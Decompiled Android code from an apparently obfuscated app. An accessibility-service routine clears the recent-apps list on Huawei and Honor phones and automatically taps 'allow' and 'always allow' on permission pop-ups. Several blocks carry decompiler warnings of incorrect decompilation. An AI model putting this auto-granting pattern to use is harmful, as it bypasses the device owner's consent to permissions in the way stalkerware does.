            t60.m214704c5("HuaweiSteps", "[清除任务] 开始执行");
            huaweiSteps$executeClearRecentTasks$1.f54026a0 = this;
            huaweiSteps$executeClearRecentTasks$1.f54029a3 = 1;
            objM212209g7 = m212209g7(huaweiSteps$executeClearRecentTasks$1);
            if (objM212209g7 != coroutineSingletons) {
                c0365a2 = this;
            }
            return coroutineSingletons;
        }
        if (i2 == 1) {
            c0365a2 = huaweiSteps$executeClearRecentTasks$1.f54026a0;
            kg1.m213544f4(objM212209g7);
        } else if (i2 == 2) {
            c0365a2 = huaweiSteps$executeClearRecentTasks$1.f54026a0;
            kg1.m213544f4(objM212209g7);
            rootInActiveWindow = c0365a2.f55063a1.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                ArrayList arrayList = new ArrayList();
                m212143a5(rootInActiveWindow, arrayList, new ArrayList());
                t60.m214702c3("HuaweiSteps", "🔍 [清除任务] 页面文本: ".concat(AbstractC0715je.m213295i2(AbstractC0715je.m213301i8(arrayList, 10), "|", null, null, null, 62)));
                Iterator it = AbstractC0716jf.m213306g5("com.huawei.android.launcher:id/clear_all_recents_image_button", "com.huawei.android.launcher:id/clearbox", "com.huawei.android.launcher:id/clear_all_btn", "com.huawei.android.launcher:id/clear_all", "com.huawei.android.launcher:id/clearAnimView", "com.huawei.android.launcher:id/clear_button", "com.huawei.android.launcher:id/dismiss_task", "com.hihonor.android.launcher:id/clear_all_recents_image_button", "com.hihonor.android.launcher:id/clearbox", "com.hihonor.android.launcher:id/clear_all_btn", "com.hihonor.android.launcher:id/clear_all", "com.hihonor.android.launcher:id/clearAnimView", "com.hihonor.android.launcher:id/clear_button", "com.android.systemui:id/clear_all", "com.android.systemui:id/dismiss_all").iterator();
                loop0: while (true) {
                    if (it.hasNext()) {
                        String str = (String) it.next();
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str);
                        if (listFindAccessibilityNodeInfosByViewId == null || (!listFindAccessibilityNodeInfosByViewId.isEmpty()) != z) {
                            z = true;
                        } else {
                            for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByViewId) {
                                if (accessibilityNodeInfo.isVisibleToUser()) {
                                    t60.m214704c5("HuaweiSteps", "[清除任务] 找到清除按钮: " + str);
                                    if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                                        t60.m214704c5("HuaweiSteps", "[清除任务] ✅ resource-id点击成功");
                                        break loop0;
                                    }
                                    if (!AbstractC0003a2.m24a5(accessibilityNodeInfo).isEmpty()) {
                                        c0365a2.m212200f7(r9.centerX(), r9.centerY());
                                        t60.m214704c5("HuaweiSteps", "[清除任务] ✅ 坐标点击成功");
                                        break loop0;
                                    }
                                    z = true;
                                }
                            }
                        }
                    } else {
                        Iterator it2 = AbstractC0716jf.m213306g5("关闭所有最近打开的应用", "关闭全部", "关闭所有", "清除全部", "清空").iterator();
                        while (true) {
                            if (it2.hasNext()) {
                                String str2 = (String) it2.next();
                                t60.m214704c5("HuaweiSteps", "[清除任务] 查找contentDescription: " + str2);
                                AccessibilityNodeInfo accessibilityNodeInfoM212147c4 = m212147c4(rootInActiveWindow, str2);
                                if (accessibilityNodeInfoM212147c4 != null && accessibilityNodeInfoM212147c4.isVisibleToUser()) {
                                    t60.m214704c5("HuaweiSteps", "[清除任务] ✅ 找到contentDescription匹配: ".concat(str2));
                                    if (accessibilityNodeInfoM212147c4.isClickable() && accessibilityNodeInfoM212147c4.performAction(16)) {
                                        t60.m214704c5("HuaweiSteps", "[清除任务] ✅ contentDescription点击成功");
                                        break;
                                    }
                                    if (!AbstractC0003a2.m24a5(accessibilityNodeInfoM212147c4).isEmpty()) {
                                        c0365a2.m212200f7(r9.centerX(), r9.centerY());
                                        t60.m214704c5("HuaweiSteps", "[清除任务] ✅ contentDescription坐标点击成功");
                                        break;
                                    }
                                }
                            } else {
                                loop3: for (String str3 : AbstractC0716jf.m213306g5("清空", "一键清理", "全部清理", "清除全部", "清除", "清理全部", "清理", "关闭全部", "关闭所有", "清空", "一鍵清理", "全部清理", "清除全部", "清除", "清理全部", "清理", "關閉全部", "關閉所有")) {
                                    t60.m214704c5("HuaweiSteps", "[清除任务] 查找: " + str3);
                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str3);
                                    if (listFindAccessibilityNodeInfosByText != null) {
                                        for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText) {
                                            if (accessibilityNodeInfo2.isVisibleToUser()) {
                                                CharSequence text = accessibilityNodeInfo2.getText();
                                                if (text == null || (string = text.toString()) == null) {
                                                    string = "";
                                                }
                                                if (string.equals(str3) || AbstractC0779a1.m213652a5(string, str3, false)) {
                                                    if (accessibilityNodeInfo2.isClickable() && accessibilityNodeInfo2.performAction(16)) {
                                                        tz0.m214807a7("[清除任务] ✅ 文本点击成功: ", str3, "HuaweiSteps");
                                                    } else {
                                                        AccessibilityNodeInfo parent = accessibilityNodeInfo2.getParent();
                                                        for (int i3 = 0; parent != null && i3 < 3; i3++) {
                                                            if (parent.isClickable() && parent.performAction(16)) {
                                                                tz0.m214807a7("[清除任务] ✅ 父节点点击成功: ", str3, "HuaweiSteps");
                                                                break loop3;
                                                            }
                                                            parent = parent.getParent();
                                                        }
                                                        if (!AbstractC0003a2.m24a5(accessibilityNodeInfo2).isEmpty()) {
                                                            c0365a2.m212200f7(r6.centerX(), r6.centerY());
                                                            t60.m214704c5("HuaweiSteps", "[清除任务] ✅ 坐标点击成功: " + str3);
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                                t60.m214704c5("HuaweiSteps", "[清除任务] ❌ 未找到清除按钮");
                            }
                        }
                    }
                }
                t60.m214704c5("HuaweiSteps", "[清除任务] 清除按钮点击成功");
                huaweiSteps$executeClearRecentTasks$1.f54026a0 = c0365a2;
                huaweiSteps$executeClearRecentTasks$1.f54029a3 = 3;
                if (b81.m210571b1(100L, huaweiSteps$executeClearRecentTasks$1) != coroutineSingletons) {
                    t60.m214704c5("HuaweiSteps", "[清除任务] 返回桌面");
                    c0365a2.f55063a1.performGlobalAction(2);
                    huaweiSteps$executeClearRecentTasks$1.f54026a0 = null;
                    huaweiSteps$executeClearRecentTasks$1.f54029a3 = 4;
                }
                return coroutineSingletons;
            }
            t60.m214704c5("HuaweiSteps", "[清除任务] 未找到清除按钮");
            t60.m214704c5("HuaweiSteps", "[清除任务] 返回桌面");
            c0365a2.f55063a1.performGlobalAction(2);
            huaweiSteps$executeClearRecentTasks$1.f54026a0 = null;
            huaweiSteps$executeClearRecentTasks$1.f54029a3 = 4;
        } else {
            if (i2 != 3) {
                if (i2 != 4) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(objM212209g7);
                t60.m214704c5("HuaweiSteps", "[清除任务] 完成");
                return C1351vv.f60710b1;
            }
            c0365a2 = huaweiSteps$executeClearRecentTasks$1.f54026a0;
            kg1.m213544f4(objM212209g7);
            t60.m214704c5("HuaweiSteps", "[清除任务] 返回桌面");
            c0365a2.f55063a1.performGlobalAction(2);
            huaweiSteps$executeClearRecentTasks$1.f54026a0 = null;
            huaweiSteps$executeClearRecentTasks$1.f54029a3 = 4;
        }
        if (((Boolean) objM212209g7).booleanValue()) {
            t60.m214704c5("HuaweiSteps", "[清除任务] 锁定成功，执行清除操作");
            huaweiSteps$executeClearRecentTasks$1.f54026a0 = c0365a2;
            huaweiSteps$executeClearRecentTasks$1.f54029a3 = 2;
            if (b81.m210571b1(100L, huaweiSteps$executeClearRecentTasks$1) != coroutineSingletons) {
                rootInActiveWindow = c0365a2.f55063a1.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                }
                t60.m214704c5("HuaweiSteps", "[清除任务] 未找到清除按钮");
                t60.m214704c5("HuaweiSteps", "[清除任务] 返回桌面");
                c0365a2.f55063a1.performGlobalAction(2);
                huaweiSteps$executeClearRecentTasks$1.f54026a0 = null;
                huaweiSteps$executeClearRecentTasks$1.f54029a3 = 4;
            }
            return coroutineSingletons;
        }
        t60.m214704c5("HuaweiSteps", "[清除任务] 锁定失败，跳过清除");
        t60.m214704c5("HuaweiSteps", "[清除任务] 返回桌面");
        c0365a2.f55063a1.performGlobalAction(2);
        huaweiSteps$executeClearRecentTasks$1.f54026a0 = null;
        huaweiSteps$executeClearRecentTasks$1.f54029a3 = 4;
    }

    /* JADX WARN: Code restructure failed: missing block: B:28:0x012a, code lost:
    
        if (p000.b81.m210571b1(100, r2) != r3) goto L30;
     */
    /* JADX WARN: Code restructure failed: missing block: B:64:0x0240, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L86;
     */
    /* JADX WARN: Code restructure failed: missing block: B:69:0x0263, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L86;
     */
    /* JADX WARN: Code restructure failed: missing block: B:72:0x0285, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L86;
     */
    /* JADX WARN: Code restructure failed: missing block: B:80:0x02b7, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L86;
     */
    /* JADX WARN: Code restructure failed: missing block: B:85:0x0303, code lost:
    
        if (r6.m212182d6(r2) != r3) goto L87;
     */
    /* JADX WARN: Removed duplicated region for block: B:33:0x014f  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x0223  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x0267  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:83:0x02c3  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:80:0x02b7 -> B:82:0x02ba). Please report as a decompilation issue!!! */
    /* renamed from: b5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212168b5(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$executeHonorBasicPermissions$1 huaweiSteps$executeHonorBasicPermissions$1;
        C0365a2 c0365a2;
        long j;
        int i;
        long jCurrentTimeMillis;
        String str;
        C0365a2 c0365a22;
        int i2;
        long j2;
        int i3;
        String str2;
        C0365a2 c0365a23;
        String str3;
        String str4;
        boolean z;
        int iOrdinal;
        int i4;
        if (continuationImpl instanceof HuaweiSteps$executeHonorBasicPermissions$1) {
            huaweiSteps$executeHonorBasicPermissions$1 = (HuaweiSteps$executeHonorBasicPermissions$1) continuationImpl;
            int i5 = huaweiSteps$executeHonorBasicPermissions$1.f54038a8;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = i5 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$executeHonorBasicPermissions$1 = new HuaweiSteps$executeHonorBasicPermissions$1(this, continuationImpl);
            }
        }
        Object objM212161a8 = huaweiSteps$executeHonorBasicPermissions$1.f54036a6;
        Object obj = CoroutineSingletons.f57606a0;
        String str5 = "╚════════════════════════════════════════════════════════════";
        String str6 = "╔════════════════════════════════════════════════════════════";
        switch (huaweiSteps$executeHonorBasicPermissions$1.f54038a8) {
            case 0:
                kg1.m213544f4(objM212161a8);
                t60.m214704c5("HuaweiSteps", "╔════════════════════════════════════════════════════════════");
                t60.m214704c5("HuaweiSteps", "║ 荣耀基础权限 - 单独处理");
                t60.m214704c5("HuaweiSteps", "║ 屏幕尺寸: " + m212181d5() + "x" + m212180d4());
                t60.m214704c5("HuaweiSteps", "║ 超时: 10秒");
                t60.m214704c5("HuaweiSteps", "╚════════════════════════════════════════════════════════════");
                huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = this;
                huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 1;
                if (m212183d7(huaweiSteps$executeHonorBasicPermissions$1) != obj) {
                    c0365a2 = this;
                    c0365a2.m212194f1();
                    huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = c0365a2;
                    huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 2;
                    break;
                }
                return obj;
            case 1:
                c0365a2 = huaweiSteps$executeHonorBasicPermissions$1.f54030a0;
                kg1.m213544f4(objM212161a8);
                c0365a2.m212194f1();
                huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = c0365a2;
                huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 2;
                break;
            case 2:
                c0365a2 = huaweiSteps$executeHonorBasicPermissions$1.f54030a0;
                kg1.m213544f4(objM212161a8);
                t60.m214704c5("HuaweiSteps", "[荣耀权限] 开始检测权限弹窗...");
                j = 10000;
                i = 0;
                jCurrentTimeMillis = System.currentTimeMillis();
                str = "";
                c0365a22 = c0365a2;
                i2 = 0;
                if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                    String str7 = str5;
                    str4 = str6;
                    long jCurrentTimeMillis2 = (System.currentTimeMillis() - jCurrentTimeMillis) / 1000;
                    if (!c0365a22.m212187e1()) {
                        String strM212179d2 = c0365a22.m212179d2();
                        int i6 = i2;
                        Object obj2 = obj;
                        str3 = str7;
                        if (jCurrentTimeMillis2 % 5 == 0 && jCurrentTimeMillis2 > 0) {
                            t60.m214704c5("HuaweiSteps", "[荣耀权限] 已用时" + jCurrentTimeMillis2 + "秒, 点击" + i + "次");
                        }
                        if (strM212179d2 != null) {
                            if (!strM212179d2.equals(str)) {
                                t60.m214704c5("HuaweiSteps", "┌────────────────────────────────────────");
                                t60.m214704c5("HuaweiSteps", "│ 权限 " + (i + 1) + ": " + strM212179d2);
                                t60.m214704c5("HuaweiSteps", "└────────────────────────────────────────");
                                str = strM212179d2;
                            }
                            huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = c0365a22;
                            huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = str;
                            huaweiSteps$executeHonorBasicPermissions$1.f54032a2 = i;
                            huaweiSteps$executeHonorBasicPermissions$1.f54033a3 = 0;
                            huaweiSteps$executeHonorBasicPermissions$1.f54034a4 = jCurrentTimeMillis;
                            huaweiSteps$executeHonorBasicPermissions$1.f54035a5 = j;
                            huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 4;
                            objM212161a8 = c0365a22.m212161a8(huaweiSteps$executeHonorBasicPermissions$1);
                            obj = obj2;
                            if (objM212161a8 != obj) {
                                long j3 = j;
                                str2 = str;
                                j2 = j3;
                                c0365a23 = c0365a22;
                                i3 = 0;
                                iOrdinal = ((HuaweiSteps$HonorClickResult) objM212161a8).ordinal();
                                if (iOrdinal != 0) {
                                    i++;
                                    t60.m214704c5("HuaweiSteps", "[荣耀权限] 点击成功");
                                    huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = c0365a23;
                                    huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = str2;
                                    huaweiSteps$executeHonorBasicPermissions$1.f54032a2 = i;
                                    huaweiSteps$executeHonorBasicPermissions$1.f54033a3 = i3;
                                    huaweiSteps$executeHonorBasicPermissions$1.f54034a4 = jCurrentTimeMillis;
                                    huaweiSteps$executeHonorBasicPermissions$1.f54035a5 = j2;
                                    huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 5;
                                    break;
                                } else {
                                    z = true;
                                    if (iOrdinal == 1) {
                                        huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = c0365a23;
                                        huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = str2;
                                        huaweiSteps$executeHonorBasicPermissions$1.f54032a2 = i;
                                        huaweiSteps$executeHonorBasicPermissions$1.f54033a3 = i3;
                                        huaweiSteps$executeHonorBasicPermissions$1.f54034a4 = jCurrentTimeMillis;
                                        huaweiSteps$executeHonorBasicPermissions$1.f54035a5 = j2;
                                        huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 7;
                                        break;
                                    } else {
                                        if (iOrdinal == 2) {
                                            huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = c0365a23;
                                            huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = str2;
                                            huaweiSteps$executeHonorBasicPermissions$1.f54032a2 = i;
                                            huaweiSteps$executeHonorBasicPermissions$1.f54033a3 = i3;
                                            huaweiSteps$executeHonorBasicPermissions$1.f54034a4 = jCurrentTimeMillis;
                                            huaweiSteps$executeHonorBasicPermissions$1.f54035a5 = j2;
                                            huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 6;
                                            break;
                                        }
                                        i2 = i3;
                                        c0365a22 = c0365a23;
                                        str = str2;
                                        j = j2;
                                        str6 = str4;
                                        str5 = str3;
                                    }
                                    if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                                    }
                                }
                            }
                        } else {
                            obj = obj2;
                            i4 = i6 + 1;
                            if (i4 < 20 || i <= 0) {
                                huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = c0365a22;
                                huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = str;
                                huaweiSteps$executeHonorBasicPermissions$1.f54032a2 = i;
                                huaweiSteps$executeHonorBasicPermissions$1.f54033a3 = i4;
                                huaweiSteps$executeHonorBasicPermissions$1.f54034a4 = jCurrentTimeMillis;
                                huaweiSteps$executeHonorBasicPermissions$1.f54035a5 = j;
                                huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 8;
                                break;
                            } else {
                                tz0.m214806a6("[荣耀权限] 权限全部完成，共点击 ", i, " 次", "HuaweiSteps");
                            }
                        }
                    } else {
                        t60.m214704c5("HuaweiSteps", "[荣耀权限] 检测到通知权限弹窗，直接点击允许");
                        if (!c0365a22.m212160a3("始终允许", true)) {
                            c0365a22.m212160a3("允许", true);
                        }
                        i++;
                        huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = c0365a22;
                        huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = str;
                        huaweiSteps$executeHonorBasicPermissions$1.f54032a2 = i;
                        huaweiSteps$executeHonorBasicPermissions$1.f54033a3 = i2;
                        huaweiSteps$executeHonorBasicPermissions$1.f54034a4 = jCurrentTimeMillis;
                        huaweiSteps$executeHonorBasicPermissions$1.f54035a5 = j;
                        huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 3;
                        if (b81.m210571b1(300L, huaweiSteps$executeHonorBasicPermissions$1) != obj) {
                            str5 = str7;
                            str6 = str4;
                            if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                                str3 = str5;
                                str4 = str6;
                            }
                        }
                    }
                    return obj;
                }
                long jCurrentTimeMillis3 = (System.currentTimeMillis() - jCurrentTimeMillis) / 1000;
                t60.m214704c5("HuaweiSteps", str4);
                t60.m214704c5("HuaweiSteps", "║ 荣耀基础权限完成，用时" + jCurrentTimeMillis3 + "秒，点击 " + i + " 次");
                t60.m214704c5("HuaweiSteps", str3);
                huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 9;
                break;
            case 3:
                long j4 = huaweiSteps$executeHonorBasicPermissions$1.f54035a5;
                jCurrentTimeMillis = huaweiSteps$executeHonorBasicPermissions$1.f54034a4;
                int i7 = huaweiSteps$executeHonorBasicPermissions$1.f54033a3;
                i = huaweiSteps$executeHonorBasicPermissions$1.f54032a2;
                String str8 = huaweiSteps$executeHonorBasicPermissions$1.f54031a1;
                C0365a2 c0365a24 = huaweiSteps$executeHonorBasicPermissions$1.f54030a0;
                kg1.m213544f4(objM212161a8);
                i2 = i7;
                c0365a22 = c0365a24;
                str = str8;
                j = j4;
                str5 = "╚════════════════════════════════════════════════════════════";
                str6 = "╔════════════════════════════════════════════════════════════";
                if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                }
                long jCurrentTimeMillis32 = (System.currentTimeMillis() - jCurrentTimeMillis) / 1000;
                t60.m214704c5("HuaweiSteps", str4);
                t60.m214704c5("HuaweiSteps", "║ 荣耀基础权限完成，用时" + jCurrentTimeMillis32 + "秒，点击 " + i + " 次");
                t60.m214704c5("HuaweiSteps", str3);
                huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 9;
                break;
            case 4:
                j2 = huaweiSteps$executeHonorBasicPermissions$1.f54035a5;
                jCurrentTimeMillis = huaweiSteps$executeHonorBasicPermissions$1.f54034a4;
                i3 = huaweiSteps$executeHonorBasicPermissions$1.f54033a3;
                i = huaweiSteps$executeHonorBasicPermissions$1.f54032a2;
                str2 = huaweiSteps$executeHonorBasicPermissions$1.f54031a1;
                c0365a23 = huaweiSteps$executeHonorBasicPermissions$1.f54030a0;
                kg1.m213544f4(objM212161a8);
                str3 = "╚════════════════════════════════════════════════════════════";
                str4 = "╔════════════════════════════════════════════════════════════";
                iOrdinal = ((HuaweiSteps$HonorClickResult) objM212161a8).ordinal();
                if (iOrdinal != 0) {
                }
                return obj;
            case 5:
                j2 = huaweiSteps$executeHonorBasicPermissions$1.f54035a5;
                jCurrentTimeMillis = huaweiSteps$executeHonorBasicPermissions$1.f54034a4;
                i3 = huaweiSteps$executeHonorBasicPermissions$1.f54033a3;
                i = huaweiSteps$executeHonorBasicPermissions$1.f54032a2;
                str2 = huaweiSteps$executeHonorBasicPermissions$1.f54031a1;
                c0365a23 = huaweiSteps$executeHonorBasicPermissions$1.f54030a0;
                kg1.m213544f4(objM212161a8);
                str3 = "╚════════════════════════════════════════════════════════════";
                str4 = "╔════════════════════════════════════════════════════════════";
                str = str2;
                i2 = i3;
                c0365a22 = c0365a23;
                j = j2;
                str6 = str4;
                str5 = str3;
                if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                }
                long jCurrentTimeMillis322 = (System.currentTimeMillis() - jCurrentTimeMillis) / 1000;
                t60.m214704c5("HuaweiSteps", str4);
                t60.m214704c5("HuaweiSteps", "║ 荣耀基础权限完成，用时" + jCurrentTimeMillis322 + "秒，点击 " + i + " 次");
                t60.m214704c5("HuaweiSteps", str3);
                huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 9;
                break;
            case 6:
                j2 = huaweiSteps$executeHonorBasicPermissions$1.f54035a5;
                jCurrentTimeMillis = huaweiSteps$executeHonorBasicPermissions$1.f54034a4;
                i3 = huaweiSteps$executeHonorBasicPermissions$1.f54033a3;
                i = huaweiSteps$executeHonorBasicPermissions$1.f54032a2;
                str2 = huaweiSteps$executeHonorBasicPermissions$1.f54031a1;
                c0365a23 = huaweiSteps$executeHonorBasicPermissions$1.f54030a0;
                kg1.m213544f4(objM212161a8);
                str3 = "╚════════════════════════════════════════════════════════════";
                str4 = "╔════════════════════════════════════════════════════════════";
                z = true;
                i2 = i3;
                c0365a22 = c0365a23;
                str = str2;
                j = j2;
                str6 = str4;
                str5 = str3;
                if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                }
                long jCurrentTimeMillis3222 = (System.currentTimeMillis() - jCurrentTimeMillis) / 1000;
                t60.m214704c5("HuaweiSteps", str4);
                t60.m214704c5("HuaweiSteps", "║ 荣耀基础权限完成，用时" + jCurrentTimeMillis3222 + "秒，点击 " + i + " 次");
                t60.m214704c5("HuaweiSteps", str3);
                huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 9;
                break;
            case 7:
                j2 = huaweiSteps$executeHonorBasicPermissions$1.f54035a5;
                jCurrentTimeMillis = huaweiSteps$executeHonorBasicPermissions$1.f54034a4;
                i3 = huaweiSteps$executeHonorBasicPermissions$1.f54033a3;
                i = huaweiSteps$executeHonorBasicPermissions$1.f54032a2;
                str2 = huaweiSteps$executeHonorBasicPermissions$1.f54031a1;
                c0365a23 = huaweiSteps$executeHonorBasicPermissions$1.f54030a0;
                kg1.m213544f4(objM212161a8);
                str3 = "╚════════════════════════════════════════════════════════════";
                str4 = "╔════════════════════════════════════════════════════════════";
                z = true;
                i2 = i3;
                c0365a22 = c0365a23;
                str = str2;
                j = j2;
                str6 = str4;
                str5 = str3;
                if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                }
                long jCurrentTimeMillis32222 = (System.currentTimeMillis() - jCurrentTimeMillis) / 1000;
                t60.m214704c5("HuaweiSteps", str4);
                t60.m214704c5("HuaweiSteps", "║ 荣耀基础权限完成，用时" + jCurrentTimeMillis32222 + "秒，点击 " + i + " 次");
                t60.m214704c5("HuaweiSteps", str3);
                huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 9;
                break;
            case 8:
                j = huaweiSteps$executeHonorBasicPermissions$1.f54035a5;
                jCurrentTimeMillis = huaweiSteps$executeHonorBasicPermissions$1.f54034a4;
                i4 = huaweiSteps$executeHonorBasicPermissions$1.f54033a3;
                i = huaweiSteps$executeHonorBasicPermissions$1.f54032a2;
                str = huaweiSteps$executeHonorBasicPermissions$1.f54031a1;
                c0365a22 = huaweiSteps$executeHonorBasicPermissions$1.f54030a0;
                kg1.m213544f4(objM212161a8);
                str3 = "╚════════════════════════════════════════════════════════════";
                str4 = "╔════════════════════════════════════════════════════════════";
                i2 = i4;
                str6 = str4;
                str5 = str3;
                if (System.currentTimeMillis() - jCurrentTimeMillis >= j) {
                }
                long jCurrentTimeMillis322222 = (System.currentTimeMillis() - jCurrentTimeMillis) / 1000;
                t60.m214704c5("HuaweiSteps", str4);
                t60.m214704c5("HuaweiSteps", "║ 荣耀基础权限完成，用时" + jCurrentTimeMillis322222 + "秒，点击 " + i + " 次");
                t60.m214704c5("HuaweiSteps", str3);
                huaweiSteps$executeHonorBasicPermissions$1.f54030a0 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54031a1 = null;
                huaweiSteps$executeHonorBasicPermissions$1.f54038a8 = 9;
                break;
            case 9:
                kg1.m213544f4(objM212161a8);
                return C1351vv.f60710b1;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:27:0x00a7, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L98;
     */
    /* JADX WARN: Code restructure failed: missing block: B:42:0x00f4, code lost:
    
        r9 = r1.f55063a1.getRootInActiveWindow();
     */
    /* JADX WARN: Code restructure failed: missing block: B:43:0x00fa, code lost:
    
        if (r9 != null) goto L45;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x00fc, code lost:
    
        r26 = r5;
     */
    /* JADX WARN: Code restructure failed: missing block: B:45:0x0104, code lost:
    
        r4 = com.storm.safe.rock.service.modules.yw5xud.C0365a2.f55053b9.getPERMISSION_ALLOW_TEXTS();
        r6 = r4.length;
        r13 = 0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:46:0x010c, code lost:
    
        if (r13 >= r6) goto L113;
     */
    /* JADX WARN: Code restructure failed: missing block: B:47:0x010e, code lost:
    
        r0 = r4[r13];
     */
    /* JADX WARN: Code restructure failed: missing block: B:48:0x0110, code lost:
    
        r19 = r9.findAccessibilityNodeInfosByText(r0);
     */
    /* JADX WARN: Code restructure failed: missing block: B:49:0x0114, code lost:
    
        if (r19 == null) goto L114;
     */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x011a, code lost:
    
        if (r19.isEmpty() == false) goto L53;
     */
    /* JADX WARN: Code restructure failed: missing block: B:53:0x011e, code lost:
    
        r19 = r19.iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:55:0x0126, code lost:
    
        if (r19.hasNext() == false) goto L115;
     */
    /* JADX WARN: Code restructure failed: missing block: B:56:0x0128, code lost:
    
        r21 = r0;
        r0 = r19.next();
        r20 = r0.getText();
     */
    /* JADX WARN: Code restructure failed: missing block: B:57:0x0136, code lost:
    
        if (r20 == null) goto L64;
     */
    /* JADX WARN: Code restructure failed: missing block: B:58:0x0138, code lost:
    
        r20 = r20.toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:59:0x013c, code lost:
    
        if (r20 == null) goto L64;
     */
    /* JADX WARN: Code restructure failed: missing block: B:60:0x013e, code lost:
    
        r20 = kotlin.text.AbstractC0779a1.m213687e0(r20).toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:61:0x0146, code lost:
    
        if (r20 != null) goto L63;
     */
    /* JADX WARN: Code restructure failed: missing block: B:63:0x0149, code lost:
    
        r22 = r4;
        r4 = r20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:64:0x014e, code lost:
    
        r20 = "";
     */
    /* JADX WARN: Code restructure failed: missing block: B:65:0x0151, code lost:
    
        r23 = r6;
        r6 = kotlin.text.AbstractC0779a1.m213687e0(r21).toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:66:0x015f, code lost:
    
        if (r4.equals(r6) == false) goto L117;
     */
    /* JADX WARN: Code restructure failed: missing block: B:67:0x0161, code lost:
    
        r20 = r7;
        r7 = r0.isClickable();
        r24 = r9;
        r25 = r13;
        r26 = r5;
        r5 = p000.AbstractC0003a2.m41c2("[华为点击] 找到按钮: '", r4, "' (目标: '", r6, "'), isClickable=");
        r5.append(r7);
        p000.t60.m214704c5("HuaweiSteps", r5.toString());
     */
    /* JADX WARN: Code restructure failed: missing block: B:68:0x0187, code lost:
    
        if (r0.isClickable() == false) goto L72;
     */
    /* JADX WARN: Code restructure failed: missing block: B:69:0x0189, code lost:
    
        r5 = r0.performAction(16);
        p000.t60.m214704c5("HuaweiSteps", "[华为点击] 直接点击结果: " + r5);
     */
